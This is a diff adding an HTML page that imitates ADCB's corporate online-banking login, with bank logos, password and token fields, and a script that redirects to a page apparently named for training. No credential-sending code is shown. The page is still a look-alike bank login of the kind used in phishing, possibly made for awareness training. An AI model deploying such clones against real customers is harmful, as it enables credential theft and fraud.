@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+	<meta name="robots" content="noindex, nofollow">
+
+	<link rel="shortcut icon" href="./favicon.ico">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+	<title>
+		ADCB - Online Banking
+	</title>
+
+	<meta name="viewport" content="width=1024, user-scalable=yes">
+
+</head>
+
+
+<body>
+	<input type="hidden" name="projectName" id="projectName" value="/corporateWeb">
+	<input type="hidden" name="bankprefix" id="bankprefix" value="demo">
+	<input type="hidden" name="listtypeforjs" id="listtypeforjs" value="">
+	<input type="hidden" name="userTokenId" id="userTokenId" value="">
+	<link href="./css/calendar.css" rel="stylesheet" type="text/css">
+	<link href="./css/common.css" rel="stylesheet" type="text/css">
+	<link href="./css/global.css" rel="stylesheet" type="text/css">
+	<link href="./css/reset.css" rel="stylesheet" type="text/css">
+	<meta http-equiv="pragma" content="no-cache">
+	<meta http-equiv="cache-control" content="no-cache">
+	<meta http-equiv="expires" content="0">
+	<meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
+	<meta http-equiv="description" content="This is my page">
+
+	<link href="./css/common.css" rel="stylesheet" type="text/css">
+
+	<link href="./css/global.css" rel="stylesheet" type="text/css">
+	<link href="./css/reset.css" rel="stylesheet" type="text/css">
+
+	<!-- Start login align -->
+	<style>
+		#header {
+			background: url(./bg-header-login.gif) repeat-x 0 0 !important;
+			height: 138px !important;
+		}
+
+		.linkDisplay {
+			display: none;
+		}
+	</style>
+	<!-- END login align -->
+	<link rel="stylesheet" href="./css/jquery-ui-1.8.17.custom.css" type="text/css" media="all">
+
+	<!-- Wrapper Starts -->
+	<div id="wrapper">
+		<!-- Header Starts -->
+
+		<div id="header">
+
+			<table width="100%">
+				<tbody>
+					<tr>
+						<td>
+							<div class="logo">
+								<a href="#"><img src="./logo.gif" alt="ADCB Active"> </a>
+							</div>
+						</td>
+						<td align="right"><img src="./ADCBnewlogo.gif" alt="ADCB"></td>
+					</tr>
+
+					<tr>
+						<td>&nbsp;</td>
+					</tr>
+
+					<tr>
+						<td id="browserCompatibleMsg" align="center" colspan="2" style="display: none;">
+							Dear user, for a seamless ProCash
+							experience we recommend that you do not use current browser <span id="browserNameSpan"></span>. Please click here to <a href="javascript:;" style="color: red; text-decoration: underline;">
+								learn
+								more
+							</a>
+						</td>
+					</tr>
+
+				</tbody>
+			</table>
+
+		</div>
+
+
+
+
+
+		<!-- Header Ends -->
+
+		<div class="error-message">
+
+
+			<div style="color: #323232; font-size: 12px;">
+
+				<br>
+			</div>
+
+		</div>
+		<!-- Container Starts -->
+		<form name="LoginForm" method="post" action="#" id="loginForm">
+			<div id="main-wrapper" class="container" style="float: left;">
+				<div id="modalbox" style="display: none;">
+					<div id="modalContent"></div>
+				</div>
+				<div class="login">
+					<div class="logintop"></div>
+					<div class="logincontent">
+						<h2>Login</h2>
+						<div id="loginoverlay" style="display: none;"></div>
+						<div class="username" style="width: 550px;">
+							<div class="usercontent">
+								<div class="field">
+									<label for="username"> Username &nbsp;&nbsp;: </label>
+									<div class="input-wrapper">
+										<input name="loginid" id="loginid" alt="LoginID" autocomplete="off" maxlength="25" onkeydown="signIn()">
+									</div>
+
+								</div>
+								<div class="field">
+									<div align="right">
+										<input type="checkbox" id="activateTokenType4" value="SOFTTOKEN" onclick="TokenTypeChanged3FA(this.id)"> SMS&nbsp; <input type="checkbox" id="activateTokenType1" value="HARDTOKEN" onclick="TokenTypeChanged3FA(this.id)"> Device&nbsp;
+										<input type="checkbox" id="activateTokenType2" value="WEBTOKEN" onclick="TokenTypeChanged3FA(this.id)"> Web&nbsp; <input type="checkbox" id="activateTokenType3" value="MOBILETOKEN" onclick="TokenTypeChanged3FA(this.id)"> Mobile&nbsp;
+									</div>
+								</div>
+								<div class="field" id="passwordDiv">
+									<label for="password"> Password &nbsp;&nbsp;: </label>
+									<div class="input-wrapper">
+										<input type="password" name="uipassword" id="uipassword" alt="Enter password" autocomplete="off" maxlength="50" onkeydown="signIn()">
+										<input type="hidden" name="password" value="">
+										<input type="hidden" name="sessionid" value="_V-XdfxzQnQj1jI3KRPQhQw">
+									</div>
+								</div>
+								<div id="mobiletokenloginDiv" style="display: none;" align="right">
+									<br> <input type="radio" id="showQRRadio" class="txtinput" value="QC" onclick="showQRScanDiv();">
+									Scan QR Code
+									&nbsp;&nbsp; <input type="radio" id="showMTRadio" class="txtinput" value="MT" onclick="showMobTokenDiv();">
+									Enter Mobile Token
+									<br>
+									<br>
+									<br>
+									<div id="QRscanDiv" style="display: none;" align="center">
+										<div id="QRDiv" style="width: 550px;">
+											<p style="text-align: center"> Scan QR Code with Mobile App</p>
+											<img id="imageFile" style="display: block;margin-left: auto; margin-right: auto; margin-top: 5px;">
+											<p style="text-align: center; margin-top: 5px;">Remaining time for QR code expiry is <span id="qrTimer"></span>&nbsp;seconds.</p>
+										</div>
+										<div id="regenerateQRLink" style="display: none; margin-top: 20px; width: 550px; text-align: center;">
+											<div id="msg" style="display: none;text-align: left;margin-left: 100;">
+												<span id="QRValidationFailed">QR code has expired. Please click on</span>
+												<a href="javascript:;" onclick="generateQRCode();">Regenerate</a>
+											</div>
+											<div id="msg1" style="display: none;"></div>
+										</div>
+										<input type="hidden" name="isQRBasedLogin" value="false" id="isQRBasedLogin">
+
+										<div style="width:550px" id="QRPopupMsgDiv">
+											<p style="text-align: left; font-size: 11px; margin-top: 1px;color: red;"> Please update your Mobile Token App to the latest version to continue using the Scan QR Code feature.</p>
+											<br>
+											<p style="text-align: left; font-size: 11px; margin-top: 1px;color: red;"> Please do not refresh the page or leave this window while your request is under process</p>
+										</div>
+
+									</div>
+									<div id="mobTokenDiv" class="field" style="display: none;">
+										<label for="mobileToken">
+											Enter
+											Token&nbsp;&nbsp;
+										</label>
+										<div class="input-wrapper">
+											<input type="password" id="mobToken" name="mobToken" alt="mobToken" autocomplete="off" maxlength="25" onchange="return checkInvalidChars(this);" onkeypress="checkKey('submit');">
+											<input type="hidden" name="mobileToken" value="">
+										</div>
+
+									</div>
+									<input type="hidden" name="loginReferenceCode" value="" id="loginReferenceCode">
+								</div>
+								<div id="erroMsgDiv" style="display: none;">
+
+								</div>
+								<div class="buttons" id="buttonsDiv">
+									<a href="#" onclick="signIn()"><img type="image" src="./btn-login.gif" alt="Login"></a> <input type="image" src="./btn-reset.gif" alt="Reset" name="reset" onclick="signIn()" id="resetButton">
+								</div>
+
+
+								<div class="buttons" id="forgotPasswordDiv" style="width:350px">
+									<a id="activateMobileTokenDiv" href="#" style="color: red;text-decoration: underline;">Activate Mobile Token</a>
+									<br>
+									<a href="#" style="color: red;text-decoration: underline;">Forgot Password?</a>
+									<br>
+									<a id="csoLink" href="#" style="color: red;text-decoration: underline;display: none">Click here for Corporate Administrator Self-Onboarding</a>
+								</div>
+							</div>
+							<div class="steps">
+								<p>
+									<strong>Step 1</strong> <br> Please enter your username and
+									password, then proceed to the next step
+								</p>
+							</div>
+						</div>
+						<div class="clear"></div>
+
+						<div id="overlay" style="opacity: 0.5;"></div>
+						<div class="token">
+							<div class="tokencontent">
+
+								<div class="field">
+									<label for="tokenno"> SMS Token No: </label>
+									<div class="input-wrapper">
+										<input type="password" name="uitokenNo" alt="SMS Token No" autocomplete="off" onkeypress="checkKey('submitToken');" disabled="">
+										<input type="hidden" name="tokenNo" value="">
+									</div>
+								</div>
+								<div class="buttons">
+									<input type="image" src="./btn-login.gif" id="submitToken" alt="Login" disabled=""> <input type="image" src="./btn-reset.gif" alt="Reset" name="resetToken" onclick="resetTokens();">
+								</div>
+							</div>
+							<div class="steps">
+								<p>
+									<strong>Step 2</strong> <br> Please insert your SMS token
+									number to access
+								</p>
+							</div>
+
+						</div>
+
+					</div>
+					<div class="loginbottom"></div>
+				</div>
+				<div class="addn-inform">
+					<div class="addn-inform-top"></div>
+					<div class="addn-inform-content">
+						<h2>Additional Information</h2>
+						<ul>
+
+							<li class="linkDisplay" style="display: block;"><a href="#" id="ProCash" overview_0="">ProCash Overview</a></li>
+							<li class="linkDisplay" style="display: block;"><a href="#" id="ADCB" mobile="" token="" app="" registration_1="">ADCB Mobile Token App Registration</a></li>
+							<li class="linkDisplay" style="display: block;"><a href="#" id="ProCash" mobile="" app_2="">ProCash Mobile App</a></li>
+							<li class="linkDisplay"></li>
+							<li>
+								<a href="#">
+									Browser
+									Requirements
+								</a>
+							</li>
+							<li>
+								<a href="#">
+									Security
+									Best Practices
+								</a>
+							</li>
+							<li>
+								<a href="#">
+									Security
+									Tips
+								</a>
+							</li>
+							<li>
+								We recommend using latest Java <br> Runtime
+								Environment for accessing our <br> online platform. <br> <br>
+								Please <a href="#">
+									<u>
+										click
+										here
+									</u>
+								</a> to download the latest version of Java.
+							</li>
+						</ul>
+					</div>
+					<div class="addn-inform-bottom"></div>
+
+				</div>
+				<!-- Additional Information End -->
+				<div class="logos">
+					<table>
+						<tbody>
+							<tr>
+								<td><img src="./ISO_certification_logo.jpg"></td>
+								<td><a href="#" target="_blank"><img src="./logo-vasco.gif" alt="Vasco"> </a></td>
+								<td>
+									<a href="#" target="_blank"><img src="./smart-seal.png" alt="Vasco"> </a>
+								</td>
+								<td>&nbsp;&nbsp;</td>
+							</tr>
+						</tbody>
+					</table>
+				</div>
+			</div>
+			<input type="hidden" id="AppletTestloaded" name="AppletTestloaded" value="">
+			<input type="hidden" id="AppletTestmaxAttempts" name="AppletTestmaxAttempts" value="">
+			<input type="hidden" id="AppletStatus" name="AppletStatus" value="">
+			<input type="hidden" id="isPluginInstalled" name="isPluginInstalled" value="">
+
+			<input type="hidden" name="method" value="unspecified">
+			<input type="hidden" name="isReset" value="N">
+			<input type="hidden" id="tokenSelected" name="tokenSelected" value="HARDTOKEN">
+			<!-- Container Ends -->
+			<input type="hidden" name="activateTokenType" value="HARDTOKEN" id="activateTokenType">
+			<input type="hidden" name="appletValidation" value="false" id="appletValidation">
+			<input type="hidden" name="hasJre" value="" id="hasJre">
+			<input type="hidden" name="tokenStatus" value="" id="tokenStatus">
+			<input type="hidden" name="serialNo" value="" id="serialNo">
+			<input type="hidden" name="mobileUserAgent" value="true" id="mobileUserAgent">
+			<input type="hidden" name="signatureOTP" value="" id="signatureOTP">
+			<input type="hidden" name="desktopBrowserWithMobFlag" value="true" id="desktopBrowserWithMobFlag">
+			<input type="hidden" name="originalData" value="" id="originalData">
+			<input type="hidden" name="mycal" value="" id="mycal">
+
+			<input type="hidden" id="browserDetails" name="browserDetails" value="Chrome 105">
+			<input type="hidden" id="warningMessage" name="warningMessage" value="No">
+			<input type="hidden" id="userClicked" name="userClicked" value="No">
+			<input type="hidden" id="os" name="os" value="">
+
+			<input name="__RequestVerificationToken" type="hidden" value="CfDJ8GAxu42FvUhMlUJD-juyCCoqThJRcy7ncNobcVXMow0NH7wm_iy2RH35sOtoUIjh7PKHJwFZalgs3poL4ntIAHrF26o16-ciKhMgdIp0dkQbsRzJROhOD131FGlgAm7M3-1QhY7V5xRo9KH9mLUe9m8" />
+		</form>
+		<div id="appletholder" style="float: right; width: 200px; padding-top: 50px;"></div>
+		<div class="clear"></div>
+		<!-- Footer Starts -->
+
+		<div id="footer" align="left" style="position: fixed; z-index: 999;">
+
+			<div class="footer-content">
+				<ul>
+					<li>
+						<a href="#">
+							Security
+							Best Practices
+						</a>
+					</li>
+					<li>
+						<a href="#">
+							Security
+							Tips
+						</a>
+					</li>
+					<li><a href="#">Contact Us</a></li>
+					<!-- To have Charges & Fees Implementation link on the login page of Corporate Front end -->
+					<li class="last"><a href="#">Charges &amp; Fees</a></li>
+				</ul>
+			</div>
+		</div>
+	</div>
+</body>
+</html>
+<script type="text/javascript">
+	var signInCalled = false;
+	function signIn() {
+
+		window.location.href = "./adcb training en.html";
+	}
+</script>
